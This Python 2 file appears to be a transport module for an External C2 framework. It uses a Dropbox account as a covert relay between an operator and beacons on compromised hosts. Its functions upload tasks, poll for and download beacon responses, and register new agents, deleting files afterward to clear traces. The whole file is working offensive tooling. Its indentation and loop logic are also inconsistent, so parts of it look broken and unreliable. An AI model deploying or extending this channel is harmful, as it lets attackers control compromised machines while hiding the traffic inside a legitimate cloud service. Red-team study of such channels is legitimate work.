#Transport Import
import dropbox
import requests
import uuid
from time import sleep

##################
# Dropbox Config #
##################

# Configure Dropbox Access Token with full access to Dropbox Account
token = " "
dbx = dropbox.Dropbox(token)
taskKeyName = 'TaskForYou'
respKeyName = 'RespForYou'

def prepTransport():
	return 0

def sendData(data, beaconId):
        # Function to Send data to External C2
        print "In Sending Data Function"
        KeyName = "{}:{}:{}".format('/' + beaconId, taskKeyName, str(uuid.uuid4()))
        dbx.files_upload(data, KeyName)

def retrieveData(beaconId):
        # Function to Receive data from external-C2.
	keyName = "{}:{}".format(beaconId, respKeyName)
        while True:
                taskResponses = []
		filez = []
                folderList = dbx.files_list_folder("")
                for file in folderList.entries:
			filez.append(file.name)
			for i in range(len(filez)):
	                        if keyName in filez[i]:
	                                print "Task response file: " + filez[i]
	                                print "Reading Task Response from: " + filez[i]
	                                try:
	                                        md, res = dbx.files_download('/' + filez[i])
	                                except dropbox.exceptions.HttpError as err:
	                                        print('*** HTTP error', err)
	                                        return None
	                                msg = res.content
	                                taskResponses.append(msg)
					sleep(2)
	                                dbx.files_delete('/' + file.name)
			                return taskResponses
        else:
                print "TaskResponse not Uploaded"
                sleep(5)
                retrieveData(beaconId)


def fetchNewBeacons():

	"""
	Function responsible for fetching new beacons that have registered
	to the DropBox API via key AGENT:BeaconId.
	TODO: When client registers, add some basic sys info like computer
	  architecture and negotiate stager based on arch.
	Returns:
	list - List of beacon IDs that need to be handled
	"""

	try:
		folderList = dbx.files_list_folder("")
		beacons = []
		for file in folderList.entries:
			if 'AGENT:' in file.name:
				beaconId = file.name.split(':')[1]
				print '[+] Discovered new Agent in bucket: {}'.format(beaconId)
				#Remove the beacon registration
				dbx.files_delete('/' + file.name)
				# append beacon
				beacons.append(beaconId)
		if beacons:
			print '[+] Returning {} beacons for first-time setup.'.format(len(beacons))
		return beacons
	except Exception, e:
		print '[-] Something went terribly wrong while polling for new agents. Reason:\n{}'.format(e)
		return []

